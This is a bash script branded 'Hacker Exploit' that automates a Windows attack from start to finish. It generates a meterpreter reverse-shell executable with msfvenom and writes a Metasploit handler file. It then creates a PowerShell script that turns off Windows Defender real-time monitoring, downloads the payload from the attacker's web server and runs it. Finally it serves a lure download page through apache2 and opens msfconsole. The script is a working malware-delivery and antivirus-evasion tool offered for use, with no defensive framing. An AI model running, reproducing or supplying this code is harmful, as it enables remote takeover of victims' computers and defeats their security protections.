#!/bin/bash



LPARTH=`pwd`

clear
#color input ==============================================================
ED=$'\e[1;31m'
GREEN=$'\e[1;32m'
YELLOW=$'\e[1;33m'
BLUE=$'\e[1;34m'
RED=$'\e[1;31m'
RESTORE=$'\e[0m'

chmod 777 *




clear

#logo or name
	echo "${GREEN} WELCOME TO The ${RESTORE}"
	echo "${RESTORE}"
	echo "${YELLOW}"

echo "                                                                                                          "     
echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
echo "                                                                                                          "
egrep -i ver toolinfo;

echo "${RESTORE}"
echo "${RED}=============================================================================================================="
echo "${RESTORE}"

	
	echo "${GREEN}your ip >> "
			myip=
			while IFS=$': \t' read -a line ;do
			    [ -z "${line%inet}" ] && ip=${line[${#line[1]}>4?1:2]} &&
				[ "${ip#127.0.0.1}" ] && myip=$ip
			  done< <(LANG=C /sbin/ifconfig)
			echo			
			echo "${RESTORE}your LHOST or local ip   ${GREEN}' $myip' ${RESTORE}"
			#echo "your LPORT or local port was set ${GREEN}'$PORT'${RESTORE} "
			#echo "your output app name was set ${GREEN}'$APPNAME'${RESTORE} "
			echo ""
echo "${RED}=============================================================================================================="

			echo "${RESTORE}"

	echo " please input your current interface ip "
	read -p ' HE :~' IP

	echo " please input your Choice Port number "
	read -p ' HE :~ ' PORT

	































	#clear input from ======================================================= 

	clear 

	#logo display ==============================================================

	echo "${GREEN}"

			echo " WELCOME TO The "
			echo "${BLUE}"	
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${YELLOW}"

	echo "=============================================================================================================="
	echo "your LHOST or local ip was set '$IP' "
	echo "your LPORT or local port was set '$PORT' "
	
	
	echo "=============================================================================================================="




			#ALL - ACTION RUN =====================================================================================
			
			echo "[*]  please input your Output App name "
			echo "${YELLOW}[*] EXAMPUL : ${BLUE}correct spelling : ${GREEN}[ WH-hackerexploit ] ${RESTORE}and ${BLUE}Wrong spelling : ${RED} [ WH hackerexploit ]"
			echo "${YELLOW}[*]  Must be use [ _  or - ] don't use [ ] Space"
			read -p ${RESTORE}' HE :~ ' APPNAME 
			#=====TEMP==DELETE==AND==CREATE===========
			rm -rf $LPARTH/temp
			rm -rf $LPARTH/WH-output
			mkdir $LPARTH/temp
			mkdir $LPARTH/WH-output
			touch $LPARTH/temp/$APPNAME.rc
			#=====TEMP==DELETE==AND==CREATE===========
echo "${RESTORE} "
echo "=============================================================================================="
echo "${YELLOW}[*] MSFVEMON  windows/meterpreter/reverse_tcp > Payload generating >  Start . ${GREEN} DONE${RESTORE} " 
echo "${RESTORE} "	
		echo "${GREEN}"
			#=======================PAYLOAD CREATE================================= 
			 
	msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=$IP LPORT=$PORT -b "\x00" -f exe -o $LPARTH/WH-output/$APPNAME.exe

			

			echo "${YELLOW}[*] payload generator >  complete . ${GREEN} DONE${RESTORE} " 

			
			sleep 0.80;
			touch $LPARTH/temp/$APPNAME.rc 
			echo "${YELLOW}[*] Temp data create >  complete . ${GREEN} DONE${RESTORE} " 
			#========exquate ip & port & handeler & payload  ==============================

			echo " use exploit/multi/handler" >> $LPARTH/temp/$APPNAME.rc 
			echo " set PAYLOAD windows/meterpreter/reverse_tcp " >> $LPARTH/temp/$APPNAME.rc
			echo " set LHOST $IP " >> $LPARTH/temp/$APPNAME.rc	
			echo " set LPORT $PORT " >> $LPARTH/temp/$APPNAME.rc
			echo "set ExitOnSession false " >> $LPARTH/temp/$APPNAME.rc	
			echo " exploit -j -z " >> $LPARTH/temp/$APPNAME.rc 
			#msg =============================================================
			
			echo "${YELLOW}[*] MSF $APPNAME.RC generator  >  complete . ${GREEN} DONE${RESTORE} " 



			#==============================DOWNLOAD================================			
			
				
				#=================POWERSHELL-START================
sleep 2.3;
echo "${YELLOW}[*] windows-defender disable Powershell script createing >  Start . ${GREEN} DONE${RESTORE} " 



cp $LPARTH/power/powershell.ps1 $LPARTH/temp/$APPNAME.ps1
sleep 1.1;
namef="$"
namef2="false"
namet="$"
namet2="true"
echo "Set-MpPreference -DisableRealtimeMonitoring $namef$namef2" >> $LPARTH/temp/$APPNAME.ps1
echo "Set-MpPreference -DisableRealtimeMonitoring $namet$namet2" >> $LPARTH/temp/$APPNAME.ps1
				
echo "cd \ " >> $LPARTH/temp/$APPNAME.ps1
echo " iwr http://$IP/wh_output/$APPNAME.exe -OutFile $APPNAME.exe " >> $LPARTH/temp/$APPNAME.ps1
echo " iwr http://$IP/wh_output/$APPNAME.exe -OutFile $APPNAME.2.exe " >> $LPARTH/temp/$APPNAME.ps1
echo "./$APPNAME.exe" >> $LPARTH/temp/$APPNAME.ps1
echo "./$APPNAME.2.exe" >> $LPARTH/temp/$APPNAME.ps1
sleep 2.6;
echo "${YELLOW}[*] windows-defender disable and run payload Powershell script >  Complete . ${GREEN} DONE${RESTORE} " 


sleep 1.1;
service apache2 start
sleep 2.3;
echo "${YELLOW}[*] apache2 has been start  >  Complete . ${GREEN} DONE${RESTORE} " 


				#=================POWERSHELL-END================


			


			#====index-start=====			
			rm -rf /var/www/html/index.html			
			rm -rf /var/www/html/wh_output
			rm -rf $LPARTH/temp/index.html 
			sleep 1.3;

			
				
			mkdir  /var/www/html/wh_output
			touch $LPARTH/temp/index.html
			sleep 1.3;			
			cp $LPARTH/WH-output/$APPNAME.exe /var/www/html/wh_output/
			cp $LPARTH/temp/$APPNAME.ps1 /var/www/html/wh_output/
			
			sleep 1.3;
echo "${YELLOW}[*] File download index.html createing >  Start . ${GREEN} DONE${RESTORE} " 


			echo "<html>" >> $LPARTH/temp/index.html
			echo "<body>" >> $LPARTH/temp/index.html
			
			name6='"'
			echo "<a href=$name6$IP/wh_output/$APPNAME.ps1 $name6 download> " >> $LPARTH/temp/index.html
			echo "$APPNAME" >> $LPARTH/temp/index.html

			echo "</a>" >> $LPARTH/temp/index.html
			echo "</body>" >> $LPARTH/temp/index.html
			echo "</html>" >> $LPARTH/temp/index.html
			sleep 2.1;
			cp $LPARTH/temp/index.html /var/www/html/index.html
			sleep 2.1;
			#xterm -hold -T "Hacker-Exploit-V2" -e "$LPARTH/ngrok http -region eu 80" &
			#====index-end=====	
	echo "${YELLOW}[*] File download index.html file create  >  Complete . ${GREEN} DONE${RESTORE} " 


			

			
		#===================================DOWNLOAD-DONE======================================
























			#Sleep & clear & logo display ==============================================================
		
			sleep 7.1;
		
			clear
	

			echo "${GREEN}"

			echo " WELCOME TO The "
			echo "${BLUE}"	
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${YELLOW}"
			echo "=============================================================================================================="
			echo "your LHOST or local ip was set ${GREEN}'$IP' ${RESTORE}"
			echo "your LPORT or local port was set ${GREEN}'$PORT'${RESTORE} "
			echo "your output app name was set ${GREEN}'$APPNAME'${RESTORE} "
			echo "DOWNLOAD LINK ${GREEN}'http://$IP/index.html'${RESTORE} "			
			echo "opening msfconsole  "
			echo "=============================================================================================================="

			echo "${RESTORE}"


			msfconsole -r $LPARTH/temp/$APPNAME.rc

			bash $LPARTH/WSMpayloadoption.sh
			#ALL - ACTION COMPLETE =====================================================================================








exit 0




































